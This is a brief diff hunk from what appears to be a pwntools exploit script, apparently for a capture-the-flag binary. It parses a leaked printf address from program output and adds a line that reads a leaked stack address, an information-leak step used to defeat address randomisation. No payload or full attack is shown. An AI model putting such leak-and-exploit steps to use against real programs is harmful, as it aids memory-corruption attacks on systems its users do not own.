@@ -82,5 +82,5 @@ m = re.search(b'0x[0-9a-fA-F]+', line)
 printf = int(m.group(), 16)
 print(hex(printf))
 
-
+stack_addr = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
 
